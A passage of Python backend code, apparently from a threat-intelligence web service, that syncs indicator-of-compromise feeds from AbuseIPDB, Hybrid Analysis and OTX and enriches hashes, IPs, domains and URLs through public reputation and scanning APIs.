                    logger.warning(f"Hybrid Analysis upsert failed for {value}: {e}")
                    skipped += 1
    except Exception as e:
        logger.error(f"Hybrid Analysis sync error: {e}")
        return {"error": f"Hybrid Analysis sync error: {e}", "items": len(items), "added": added, "updated": updated, "skipped": skipped}

    summary = {"items": len(items), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "hybrid_analysis"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"Hybrid Analysis sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# AbuseIPDB blacklist sync — pulls top abused IPs and upserts them.
# NOTE: /api/v2/blacklist is a subscriber/paid tier feature on AbuseIPDB.
# On a free key you'll get HTTP 402/403 and this sync returns a friendly error.
# ---------------------------------------------------------------------------
ABUSEIPDB_BLACKLIST_URL = "https://api.abuseipdb.com/api/v2/blacklist"
ABUSEIPDB_BLACKLIST_MAX = 1000
ABUSEIPDB_CONFIDENCE_MIN = 90


async def _sync_abuseipdb_blacklist(limit: int = ABUSEIPDB_BLACKLIST_MAX, confidence_min: int = ABUSEIPDB_CONFIDENCE_MIN) -> dict:
    if not ABUSEIPDB_API_KEY:
        return {"error": "ABUSEIPDB_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = 0
    items: List[dict] = []
    try:
        async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
            r = await hc.get(
                ABUSEIPDB_BLACKLIST_URL,
                params={"confidenceMinimum": confidence_min, "limit": limit},
                headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
            )
            if r.status_code == 402 or r.status_code == 403:
                return {"error": "AbuseIPDB blacklist requires a paid subscription (Basic/Premium tier)", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            if r.status_code != 200:
                return {"error": f"AbuseIPDB blacklist failed ({r.status_code})", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            payload = r.json() or {}
            items = payload.get("data") or []
            for it in items:
                ip = (it.get("ipAddress") or "").strip()
                if not ip or _classify_ioc(ip) != "ip":
                    skipped += 1
                    continue
                score = int(it.get("abuseConfidenceScore") or 0)
                cc = (it.get("countryCode") or "").strip()
                sev = "critical" if score >= 95 else "high" if score >= 90 else "medium"
                tags = ["abuseipdb"]
                if cc:
                    tags.append(f"country:{cc}")
                tags.append(f"confidence:{score}")
                threat_name = f"AbuseIPDB confidence {score}"
                notes = f"Last reported {it.get('lastReportedAt') or 'unknown'}"
                try:
                    _, created = await _upsert_ioc(ip, threat_name, tags, "AbuseIPDB Blacklist", sev, notes)
                    added += 1 if created else 0
                    updated += 0 if created else 1
                except Exception as e:
                    logger.warning(f"AbuseIPDB upsert failed for {ip}: {e}")
                    skipped += 1
    except Exception as e:
        logger.error(f"AbuseIPDB sync error: {e}")
        return {"error": f"AbuseIPDB sync error: {e}", "items": len(items), "added": added, "updated": updated, "skipped": skipped}

    summary = {"items": len(items), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "abuseipdb"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"AbuseIPDB sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Multi-source curated-IOC sync orchestrator (One-click "Sync all sources")
# ---------------------------------------------------------------------------
SYNC_SOURCES = [
    # key,             display name,        can_sync, reason_if_not
    ("otx",             "AlienVault OTX",    True,  None),
    ("hybrid_analysis", "Hybrid Analysis",   True,  None),
    ("abuseipdb",       "AbuseIPDB",         True,  None),
    ("urlscan",         "URLScan.io",        False, "Bulk 'malicious verdicts' search requires urlscan Pro"),
    ("virustotal",      "VirusTotal",        False, "Bulk hunting feed requires VT Enterprise tier"),
    ("talos",           "Cisco Talos",       False, "No public bulk IOC feed available"),
    ("shodan",          "Shodan",            False, "Not a curated IOC feed (internet scan engine)"),
]


@api_router.get("/iocs/sync-status")
async def iocs_sync_status():
    metas = {}
    async for doc in db.sync_meta.find({}, {"_id": 1, "items": 1, "pulses": 1, "indicators": 1, "added": 1, "updated": 1, "skipped": 1, "synced_at": 1, "error": 1}):
        metas[doc["_id"]] = {k: v for k, v in doc.items() if k != "_id"}
    # OTX still has its own doc under otx_meta for backwards-compat.
    otx_doc = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})
    if otx_doc and "otx" not in metas:
        metas["otx"] = otx_doc

    key_map = {
        "otx": bool(OTX_API_KEY),
        "hybrid_analysis": bool(HYBRID_ANALYSIS_API_KEY),
        "abuseipdb": bool(ABUSEIPDB_API_KEY),
        "urlscan": bool(URLSCAN_API_KEY) if 'URLSCAN_API_KEY' in globals() else False,
        "virustotal": bool(VT_API_KEY) if 'VT_API_KEY' in globals() else False,
        "talos": False,
        "shodan": False,
    }
    sources = []
    for key, label, can_sync, reason in SYNC_SOURCES:
        sources.append({
            "key": key,
            "label": label,
            "can_sync": can_sync,
            "reason": reason,
            "configured": key_map.get(key, False),
            "last_sync": metas.get(key),
        })
    return {"sources": sources}


@api_router.post("/iocs/sync-all")
async def iocs_sync_all(user: dict = Depends(get_current_user)):
    """One-click sync across every source that provides a bulk IOC feed.
    Runs OTX + Hybrid Analysis + AbuseIPDB in parallel. Sources without a
    public bulk feed (VT / URLScan / Talos / Shodan) are reported as skipped."""
    tasks = {
        "otx": _sync_otx_pulses() if OTX_API_KEY else None,
        "hybrid_analysis": _sync_hybrid_analysis_feed() if HYBRID_ANALYSIS_API_KEY else None,
        "abuseipdb": _sync_abuseipdb_blacklist() if ABUSEIPDB_API_KEY else None,
    }
    active_keys = [k for k, v in tasks.items() if v is not None]
    results_list = await asyncio.gather(*[tasks[k] for k in active_keys], return_exceptions=True)
    results: dict = {}
    total_added = total_updated = 0
    for k, r in zip(active_keys, results_list):
        if isinstance(r, Exception):
            results[k] = {"error": str(r)}
        else:
            results[k] = r
            total_added += int(r.get("added") or 0)
            total_updated += int(r.get("updated") or 0)

    # Fill in skipped sources so the client can render a complete status.
    for key, label, can_sync, reason in SYNC_SOURCES:
        if key in results:
            continue
        if not can_sync:
            results[key] = {"skipped": True, "reason": reason}
        else:
            results[key] = {"error": f"{label} is not configured"}

    return {
        "totals": {"added": total_added, "updated": total_updated},
        "results": results,
        "synced_at": now_iso(),
    }





# ---------------------------------------------------------------------------
# Live external threat feed (CISA Known Exploited Vulnerabilities)
# ---------------------------------------------------------------------------
_feed_cache: dict[str, Any] = {"ts": None, "data": None}


# ---------------------------------------------------------------------------
# Smart IOC lookup / enrichment (key-free sources + prefilled deep links)
# ---------------------------------------------------------------------------
def _classify_ioc(value: str) -> str:
    v = value.strip()
    if re.fullmatch(r"[a-fA-F0-9]{64}", v):
        return "sha256"
    if re.fullmatch(r"[a-fA-F0-9]{40}", v):
        return "sha1"
    if re.fullmatch(r"[a-fA-F0-9]{32}", v):
        return "md5"
    if re.fullmatch(r"(\d{1,3}\.){3}\d{1,3}", v):
        return "ip"
    if v.lower().startswith(("http://", "https://")):
        return "url"
    if re.fullmatch(r"([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}", v.replace("[.]", ".")):
        return "domain"
    return "unknown"


def _ioc_links(value: str, kind: str) -> dict:
    v = value.strip().replace("[.]", ".")
    from urllib.parse import quote
    q = quote(v, safe="")
    links = {}
    if kind in ("md5", "sha1", "sha256"):
        links["VirusTotal"] = f"https://www.virustotal.com/gui/file/{v}"
        links["MalwareBazaar"] = f"https://bazaar.abuse.ch/browse.php?search={kind}%3A{v}"
        links["ThreatFox"] = f"https://threatfox.abuse.ch/browse.php?search=hash%3A{v}"
        links["Hybrid Analysis"] = f"https://www.hybrid-analysis.com/search?query={v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/malware/{v}"
    elif kind == "ip":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/ip-address/{v}"
        links["AbuseIPDB"] = f"https://www.abuseipdb.com/check/{v}"
        links["Cisco Talos"] = f"https://talosintelligence.com/reputation_center/lookup?search={v}"
        links["Shodan"] = f"https://www.shodan.io/host/{v}"
        links["GreyNoise"] = f"https://viz.greynoise.io/ip/{v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/ip/{v}"
    elif kind == "domain":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/domain/{v}"
        links["urlscan.io"] = f"https://urlscan.io/search/#{q}"
        links["Cisco Talos"] = f"https://talosintelligence.com/reputation_center/lookup?search={v}"
        links["Shodan"] = f"https://www.shodan.io/search?query=hostname%3A{v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/url/{v}"
    elif kind == "url":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/search/{q}"
        links["urlscan.io"] = f"https://urlscan.io/search/#{q}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/url/{q}"
    return links


# ---------------------------------------------------------------------------
# Optional key-based reputation providers (VirusTotal v3 + AbuseIPDB v2)
# Keys are OPTIONAL: absent keys are skipped gracefully. Results are cached in
# MongoDB (ioc_cache) for 6h to conserve free-tier daily quotas.
# ---------------------------------------------------------------------------
VT_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY")
ABUSEIPDB_API_KEY = os.environ.get("ABUSEIPDB_API_KEY")
URLSCAN_API_KEY = os.environ.get("URLSCAN_API_KEY")
EMERGENT_LLM_KEY = os.environ.get("EMERGENT_LLM_KEY")
HYBRID_ANALYSIS_API_KEY = os.environ.get("HYBRID_ANALYSIS_API_KEY")
_HA_BASE = "https://hybrid-analysis.com/api/v2"  # non-www — www 301-redirects and Cloudflare drops POST bodies
_HA_HEADERS = {"api-key": HYBRID_ANALYSIS_API_KEY or "", "User-Agent": "Falcon Sandbox", "Accept": "application/json"}
_REP_TTL = timedelta(hours=6)


async def _ha_hash_lookup(hc: httpx.AsyncClient, hash_value: str) -> Optional[dict]:
    """Look up a hash on Hybrid Analysis. Uses /overview/{sha256} (v2 replacement
    for deprecated /search/hash). Returns None when disabled, {'skipped':True} for
    non-SHA256 hashes since HA overview requires SHA256."""
    if not HYBRID_ANALYSIS_API_KEY:
        return None
    kind = _classify_ioc(hash_value)
    if kind != "sha256":
        return {"skipped": True, "reason": "sha256_required"}
    try:
        r = await hc.get(
            f"{_HA_BASE}/overview/{hash_value}",
            headers=_HA_HEADERS,
            follow_redirects=True,
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code == 404:
            return {"found": False}
        if r.status_code != 200:
            return {"error": "request_failed"}
        d = r.json() or {}
        if not d.get("sha256"):
            return {"found": False}
        # Pick top vx_family from scanners[].family if present.
        family = None
        for sc in (d.get("scanners") or []):
            if sc.get("family"):
                family = sc["family"]
                break
        classification = d.get("classification_tags") or []
        return {
            "found": True,
            "verdict": d.get("verdict"),
            "threat_score": d.get("threat_score"),
            "vx_family": family,
            "classification": classification[:5],
            "type_short": d.get("type_short"),
            "last_file_name": d.get("last_file_name"),
            "size": d.get("size"),
            "reports": len(d.get("children") or []) + 1,
            "url": f"https://www.hybrid-analysis.com/sample/{d['sha256']}",
            "submitted_at": d.get("last_multi_scan") or d.get("analysis_start_time"),
        }
    except Exception:
        return {"error": "request_failed"}


async def _ha_search_terms(hc: httpx.AsyncClient, params: dict, limit: int = 12) -> Optional[dict]:
    """Search HA for sandboxed samples matching the given terms (host/domain/url/etc).
    `params` is a dict like {'host': '1.2.3.4'} or {'domain': 'example.com'}.
    Returns normalized {count, families:[...], samples:[...]} or None if disabled."""
    if not HYBRID_ANALYSIS_API_KEY:
        return None
    try:
        r = await hc.post(f"{_HA_BASE}/search/terms", data=params, headers={**_HA_HEADERS, "Content-Type": "application/x-www-form-urlencoded"})
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": "request_failed"}
        j = r.json() or {}
        results = j.get("result") or []
        if not results:
            return {"found": False, "count": 0, "families": [], "samples": []}
        # Aggregate families
        fam_counts: dict = {}
        for x in results:
            f = (x.get("vx_family") or "").strip()
            if f:
                fam_counts[f] = fam_counts.get(f, 0) + 1
        families = sorted([{"name": f, "count": c} for f, c in fam_counts.items()], key=lambda x: x["count"], reverse=True)[:5]
        samples = []
        for x in results[:limit]:
            samples.append({
                "sha256": x.get("sha256"),
                "verdict": x.get("verdict"),
                "threat_score": x.get("threat_score"),
                "vx_family": x.get("vx_family"),
                "av_detect": x.get("av_detect"),
                "submit_name": x.get("submit_name"),
                "environment": x.get("environment_description") or x.get("environment_id"),
                "analysis_start_time": x.get("analysis_start_time"),
                "url": f"https://www.hybrid-analysis.com/sample/{x.get('sha256')}" if x.get("sha256") else None,
            })
        # Overall malicious count
        malicious = sum(1 for x in results if (x.get("verdict") or "").lower() == "malicious")
        return {
            "found": True,
            "count": j.get("count") or len(results),
            "malicious": malicious,
            "families": families,
            "samples": samples,
        }
    except Exception:
        return {"error": "request_failed"}


async def _ha_quick_scan_url(hc: httpx.AsyncClient, url_value: str, scan_type: str = "all") -> dict:
    """Submit a URL for shallow multi-scanner analysis. Returns normalized verdict."""
    if not HYBRID_ANALYSIS_API_KEY:
        return {"error": "not_configured"}
    try:
        r = await hc.post(
            f"{_HA_BASE}/quick-scan/url",
            data={"url": url_value, "scan_type": scan_type},
            headers={**_HA_HEADERS, "Content-Type": "application/x-www-form-urlencoded"},
            timeout=30,
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code >= 400:
            try:
                return {"error": "invalid_input", "detail": r.json()}
            except Exception:
                return {"error": "request_failed"}
        j = r.json() or {}
        scanners = j.get("scanners") or []
        # Normalize scanner rows.
        rows = []
        malicious_hits = 0
        for s in scanners:
            positives = s.get("positives")
            is_mal = (positives is not None and positives > 0)
            if is_mal:
                malicious_hits += 1
            rows.append({
                "name": s.get("name"),
                "status": s.get("status"),
                "positives": positives,
                "total": s.get("total"),
                "percent": s.get("percent"),
                "error_message": s.get("error_message"),
            })
        verdict = "malicious" if malicious_hits >= 2 else ("suspicious" if malicious_hits == 1 else "no threat")
        return {
            "id": j.get("id"),
            "sha256": j.get("sha256"),
            "submission_type": j.get("submission_type"),
            "verdict": verdict,
            "malicious_scanners": malicious_hits,
            "total_scanners": len(scanners),
            "scanners": rows,
            "reports_count": len(j.get("reports") or []),
            "report_url": f"https://www.hybrid-analysis.com/sample/{j['sha256']}" if j.get("sha256") else None,
        }
    except Exception as e:
        logger.warning(f"HA quick scan error: {e}")
        return {"error": "request_failed"}


class HaUrlInput(BaseModel):
    url: str
    scan_type: str = "all"


@api_router.post("/hybrid/quick-scan-url")
async def hybrid_quick_scan_url(payload: HaUrlInput):
    if not HYBRID_ANALYSIS_API_KEY:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    url_value = (payload.url or "").strip()
    if not url_value or not url_value.lower().startswith(("http://", "https://")):
        raise HTTPException(status_code=422, detail="Provide a valid http(s) URL")
    async with httpx.AsyncClient(timeout=35, follow_redirects=True) as hc:
        result = await _ha_quick_scan_url(hc, url_value, payload.scan_type or "all")
    if result.get("error"):
        raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
    return result


class HaSearchInput(BaseModel):
    value: str
    limit: int = 15


@api_router.post("/hybrid/search-samples")
async def hybrid_search_samples(payload: HaSearchInput):
    """Return sandboxed samples on Hybrid Analysis that observed/contacted the
    given host, domain, IP or URL. Powers the 'Sandboxed samples that contacted
    this' enrichment panel in the IOC Analyzer."""
    if not HYBRID_ANALYSIS_API_KEY:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    raw = (payload.value or "").strip()
    if not raw:
        raise HTTPException(status_code=422, detail="value is required")
    # Normalize + choose the right HA search term based on IOC kind.
    from urllib.parse import urlparse
    normalized = raw
    kind = _classify_ioc(raw)
    if kind == "url":
        # Extract host from URL for a broader match (HA "host" indexes samples that resolved/connected to that host).
        try:
            parsed = urlparse(raw)
            host = (parsed.hostname or "").strip()
        except Exception:
            host = ""
        if not host:
            raise HTTPException(status_code=422, detail="Invalid URL")
        params = {"host": host}
        normalized = host
        term = "host"
    elif kind == "ip":
        params = {"host": raw}
        term = "host"
    elif kind == "domain":
        params = {"domain": raw}
        term = "domain"
    else:
        raise HTTPException(status_code=422, detail="Only IP, domain or URL indicators are supported")

    limit = max(1, min(int(payload.limit or 15), 40))
    async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
        result = await _ha_search_terms(hc, params, limit=limit)
    if result is None:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    if result.get("error"):
        raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
    return {"queried": normalized, "term": term, **result}


class HaLookupInput(BaseModel):
    value: str
    limit: int = 12


@api_router.post("/hybrid/lookup")
async def hybrid_lookup(payload: HaLookupInput):
    """Universal Hybrid Analysis lookup — auto-classifies the input and routes to
    the right HA endpoint. Powers the on-page 'HA IOC Analyzer' so a single
    input box can handle URLs, file hashes, IPs and domains.

    Returns a unified envelope: {kind, value, result: {...}} where the shape of
    `result` depends on `kind`:
      - url:            {verdict, malicious_scanners, total_scanners, scanners[], report_url, reports_count}
      - sha256/sha1/md5:{found, verdict, threat_score, vx_family, classification[], reports, url, submitted_at}
      - ip / domain:    {count, malicious, families[], samples[]}
    """
    if not HYBRID_ANALYSIS_API_KEY:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    raw = (payload.value or "").strip()
    if not raw:
        raise HTTPException(status_code=422, detail="value is required")

    kind = _classify_ioc(raw)
    async with httpx.AsyncClient(timeout=35, follow_redirects=True) as hc:
        if kind == "url":
            result = await _ha_quick_scan_url(hc, raw, "all")
            if result.get("error"):
                raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
            return {"kind": "url", "value": raw, "result": result}

        if kind in ("sha256", "sha1", "md5"):
            result = await _ha_hash_lookup(hc, raw)
            if not result:
                raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
            if result.get("skipped"):
                # HA overview only supports SHA256 — surface that clearly.
                raise HTTPException(status_code=422, detail=f"Hybrid Analysis /overview supports SHA256 only. You provided a {kind.upper()}. Provide the SHA256 (or run VT/URLScan via the OSINT analyzer above).")
            if result.get("error"):
                raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
            return {"kind": kind, "value": raw, "result": result}

        if kind in ("ip", "domain"):
            from urllib.parse import urlparse  # noqa: F401 (kept for symmetry / future)
            params = {"host": raw} if kind == "ip" else {"domain": raw}
            limit = max(1, min(int(payload.limit or 12), 40))
            result = await _ha_search_terms(hc, params, limit=limit)
            if result is None:
                raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
            if result.get("error"):
                raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
            return {"kind": kind, "value": raw, "result": result}

        raise HTTPException(status_code=422, detail=f"Unsupported IOC type ({kind or 'unknown'}). Provide a URL, SHA256/SHA1/MD5 hash, IP address, or domain.")



def _vt_url_id(u: str) -> str:
    import base64
    return base64.urlsafe_b64encode(u.encode("utf-8")).decode("utf-8").strip("=")


async def _vt_lookup(hc: httpx.AsyncClient, kind: str, normalized: str) -> Optional[dict]:
    if not VT_API_KEY:
        return None
    if kind == "ip":
        path = f"ip_addresses/{normalized}"
    elif kind == "domain":
        path = f"domains/{normalized}"
    elif kind == "url":
        path = f"urls/{_vt_url_id(normalized)}"
    else:
        path = f"files/{normalized}"
    try:
        r = await hc.get(f"https://www.virustotal.com/api/v3/{path}", headers={"x-apikey": VT_API_KEY, "accept": "application/json"})
        if r.status_code == 404:
            return {"found": False, "malicious": 0, "suspicious": 0, "harmless": 0, "undetected": 0, "total": 0, "reputation": None}
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": f"http_{r.status_code}"}
        attrs = ((r.json() or {}).get("data") or {}).get("attributes") or {}
        stats = attrs.get("last_analysis_stats") or {}
        mal = stats.get("malicious", 0) or 0
        susp = stats.get("suspicious", 0) or 0
        harm = stats.get("harmless", 0) or 0
        undet = stats.get("undetected", 0) or 0
        total = mal + susp + harm + undet + (stats.get("timeout", 0) or 0)
        ptc = attrs.get("popular_threat_classification") or {}
        threat_categories = [c.get("value") for c in (ptc.get("popular_threat_category") or []) if c.get("value")]
        return {
            "found": True,
            "malicious": mal,
            "suspicious": susp,
            "harmless": harm,
            "undetected": undet,
            "total": total,
            "reputation": attrs.get("reputation"),
            "label": attrs.get("meaningful_name") or attrs.get("type_description"),
            "last_analysis_date": attrs.get("last_analysis_date"),
            "threat_label": ptc.get("suggested_threat_label"),
            "threat_categories": threat_categories[:6],
            "tags": (attrs.get("tags") or [])[:10],
        }
    except Exception:
        return {"error": "request_failed"}


async def _abuseipdb_lookup(hc: httpx.AsyncClient, normalized: str) -> Optional[dict]:
    if not ABUSEIPDB_API_KEY:
        return None
    try:
        r = await hc.get(
            "https://api.abuseipdb.com/api/v2/check",
            headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
            params={"ipAddress": normalized, "maxAgeInDays": "90"},
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": f"http_{r.status_code}"}
        d = (r.json() or {}).get("data") or {}
        return {
            "score": d.get("abuseConfidenceScore"),
            "reports": d.get("totalReports"),
            "country": d.get("countryCode"),
            "isp": d.get("isp"),
            "domain": d.get("domain"),
            "whitelisted": d.get("isWhitelisted"),
        }
    except Exception:
        return {"error": "request_failed"}


async def _reputation(hc: httpx.AsyncClient, kind: str, normalized: str) -> Optional[dict]:
    """VT + AbuseIPDB + Hybrid Analysis reputation with 6h Mongo cache. Returns None when no keys set."""
    if not VT_API_KEY and not ABUSEIPDB_API_KEY and not HYBRID_ANALYSIS_API_KEY:
        return None
    cache_key = f"{kind}:{normalized}"
    try:
        doc = await db.ioc_cache.find_one({"_id": cache_key})
        if doc and doc.get("ts"):
            if datetime.now(timezone.utc) - datetime.fromisoformat(doc["ts"]) < _REP_TTL:
                return doc.get("reputation")
    except Exception:
        pass
    rep = {"vt": await _vt_lookup(hc, kind, normalized), "abuseipdb": None, "hybrid_analysis": None}
    if kind == "ip":
        rep["abuseipdb"] = await _abuseipdb_lookup(hc, normalized)
    if kind in ("md5", "sha1", "sha256"):
        rep["hybrid_analysis"] = await _ha_hash_lookup(hc, normalized)
    try:
        await db.ioc_cache.update_one({"_id": cache_key}, {"$set": {"reputation": rep, "ts": now_iso()}}, upsert=True)
    except Exception:
        pass
    return rep


async def _shodan_ip(hc: httpx.AsyncClient, ip: str) -> dict:
    try:
        r = await hc.get(f"https://internetdb.shodan.io/{ip}")
        return r.json() if r.status_code == 200 else {}
    except Exception:
        return {}


async def _geo_ip(hc: httpx.AsyncClient, ip: str) -> dict:
    try:
        r = await hc.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,org,as,query")
        j = r.json()
        return j if j.get("status") == "success" else {}
    except Exception:
        return {}


async def _resolve_host(hc: httpx.AsyncClient, host: str) -> Optional[str]:
    """Resolve a hostname's first A record via Google DNS-over-HTTPS (no key)."""
    try:
        r = await hc.get(f"https://dns.google/resolve?name={host}&type=A", headers={"Accept": "application/json"})
        if r.status_code == 200:
            for ans in (r.json() or {}).get("Answer", []):
                if ans.get("type") == 1 and ans.get("data"):
                    return ans["data"]
    except Exception:
        pass
    return None


async def _do_lookup(hc: httpx.AsyncClient, value: str) -> dict:
    """Full IOC lookup: classify + free enrichment + optional key-based reputation."""
    value = (value or "").strip()
    kind = _classify_ioc(value)
    if kind == "unknown":
        return {"value": value, "type": "unknown", "links": {}, "enrichment": None, "reputation": None, "local_db": None}
    normalized = value.replace("[.]", ".")
    result = {"value": value, "type": kind, "links": _ioc_links(value, kind), "enrichment": None, "reputation": None, "local_db": None}

    try:
        local = await db.iocs.find_one({"key": _ioc_key(value)}, {"_id": 0})
        if local:
            result["local_db"] = {
                "threat_name": local.get("threat_name"),
                "severity": local.get("severity"),
                "tags": local.get("tags", []),
                "source": local.get("source"),
                "notes": local.get("notes"),
                "created_at": local.get("created_at"),
            }
    except Exception:
        pass

    try:
        if kind == "ip":
            sh, gj = await asyncio.gather(_shodan_ip(hc, normalized), _geo_ip(hc, normalized))
            result["enrichment"] = {
                "kind": "ip",
                "geo": {"country": gj.get("country"), "city": gj.get("city"), "isp": gj.get("isp"), "org": gj.get("org"), "asn": gj.get("as")} if gj else None,
                "open_ports": sh.get("ports", []),
                "hostnames": sh.get("hostnames", []),
                "tags": sh.get("tags", []),
                "vulns": sh.get("vulns", []),
                "sources": ["Shodan InternetDB", "ip-api.com"],
            }
        elif kind in ("domain", "url"):
            from urllib.parse import urlparse
            parsed = urlparse(normalized) if kind == "url" else None
            host = ((parsed.netloc if parsed else normalized).split(":")[0]) if (parsed or normalized) else ""
            # Full requested URL (only for URL inputs).
            requested_url = normalized if kind == "url" else None

            def _norm_url(u: str) -> str:
                return (u or "").rstrip("/").lower()

            # urlscan search always keys on domain for broad recall; ranking below picks the
            # scan whose page matches the requested URL first, then falls back to path prefix,
            # then any scan for the host. Homepage is only a last-resort fallback.

            async def urlscan():
                try:
                    headers = {"API-Key": URLSCAN_API_KEY} if URLSCAN_API_KEY else {}

                    def _norm_host(u: str) -> str:
                        try:
                            from urllib.parse import urlparse as _up
                            h = (_up(u).netloc or "").lower().split(":")[0]
                            return h[4:] if h.startswith("www.") else h
                        except Exception:
                            return ""

                    target_host = (host[4:] if host.startswith("www.") else host).lower()

                    all_results: list[dict] = []
                    scan_count = 0

                    # Step 1 — for URL inputs, try an exact URL match first.
                    if requested_url:
                        exact_q = f'page.url:"{requested_url}"'
                        r1 = await hc.get(f"https://urlscan.io/api/v1/search/?q={exact_q}&size=5", headers=headers)
                        if r1.status_code == 200:
                            j1 = r1.json()
                            # Even the "exact" search can return unrelated tokenized matches — filter by host.
                            for x in (j1.get("results", []) or []):
                                if _norm_host(x.get("task", {}).get("url", "")) == target_host:
                                    all_results.append(x)
                            scan_count = j1.get("total", 0) or scan_count

                    # Step 2 — quoted-domain search + strict host filter (defends against urlscan's
                    # loose token matching that used to return unrelated scans containing the host token).
                    if host:
                        dq = f'page.domain:"{host}"'
                        r2 = await hc.get(f"https://urlscan.io/api/v1/search/?q={dq}&size=25", headers=headers)
                        if r2.status_code == 200:
                            j2 = r2.json()
                            filtered = [x for x in (j2.get("results", []) or []) if _norm_host(x.get("task", {}).get("url", "")) == target_host]
                            existing_ids = {x.get("_id") for x in all_results}
                            for x in filtered:
                                if x.get("_id") not in existing_ids:
                                    all_results.append(x)
                            scan_count = scan_count or j2.get("total", 0) or 0

                    recent = [{"url": x["task"]["url"], "date": x["task"].get("time"), "score": x.get("verdicts", {}).get("overall", {}).get("score"), "screenshot": x.get("screenshot")} for x in all_results[:5]]

                    def _is_home(u: str) -> bool:
                        n = _norm_url(u)
                        return n in (f"http://{host}", f"https://{host}", f"http://www.{host}", f"https://www.{host}")

                    def _rank(x: dict) -> int:
                        u = _norm_url(x.get("task", {}).get("url", ""))
                        if not x.get("screenshot"):
                            return 99
                        if requested_url:
                            req = _norm_url(requested_url)
                            if u == req:
                                return 0
                            # If the user typed a homepage URL, prefer the homepage.
                            if _is_home(req):
                                return 0 if _is_home(u) else 3
                            if req and u.startswith(req + "/"):
                                return 1
                            if req.startswith(u + "/") and not _is_home(u):
                                return 2
                            if not _is_home(u):
                                return 3
                            return 5
                        return 0 if _is_home(u) else 3

                    ranked = sorted(all_results, key=_rank)
                    preview = None
                    for x in ranked:
                        if x.get("screenshot"):
                            preview = {"screenshot": x["screenshot"], "url": x.get("task", {}).get("url"), "result": x.get("result")}
                            break
                    return {"scan_count": scan_count, "recent_scans": recent, "preview": preview}
                except Exception:
                    return {"scan_count": 0, "recent_scans": [], "preview": None}

            us, resolved = await asyncio.gather(urlscan(), _resolve_host(hc, host))
            sources = ["Google DNS", "urlscan.io"]
            enr = {
                "kind": "web",
                "host": host,
                "resolved_ip": resolved,
                "geo": None,
                "open_ports": [],
                "hostnames": [],
                "vulns": [],
                "scan_count": us["scan_count"],
                "recent_scans": us["recent_scans"],
                "preview": us.get("preview"),
                "sources": sources,
            }
            if resolved:
                sh, gj = await asyncio.gather(_shodan_ip(hc, resolved), _geo_ip(hc, resolved))
                enr["geo"] = {"country": gj.get("country"), "city": gj.get("city"), "isp": gj.get("isp"), "org": gj.get("org"), "asn": gj.get("as")} if gj else None
                enr["open_ports"] = sh.get("ports", [])
                enr["hostnames"] = sh.get("hostnames", [])
                enr["vulns"] = sh.get("vulns", [])
                enr["sources"] = ["Google DNS", "Shodan InternetDB", "ip-api.com", "urlscan.io"]
            result["enrichment"] = enr
        else:
            # File hash — key-free lookup against CIRCL hashlookup (known-file DB)
            enr = {
                "kind": "hash",
                "hash_type": kind,
                "found": False,
                "known_malicious": False,
                "filename": None,
                "filesize": None,
                "product": None,
                "source_label": None,
                "note": "Not found in the CIRCL known-file database. Use the deep links below to check reputation on VirusTotal, MalwareBazaar and others.",
                "sources": ["CIRCL hashlookup"],
            }
            try:
                r = await hc.get(f"https://hashlookup.circl.lu/lookup/{kind}/{normalized}", headers={"Accept": "application/json"})
                if r.status_code == 200:
                    j = r.json()
                    if isinstance(j, dict) and not j.get("message"):
                        enr["found"] = True
                        enr["known_malicious"] = bool(j.get("KnownMalicious"))
                        enr["filename"] = j.get("FileName")
                        enr["filesize"] = j.get("FileSize")
                        enr["product"] = (j.get("ProductCode") or {}).get("ProductName") if isinstance(j.get("ProductCode"), dict) else None
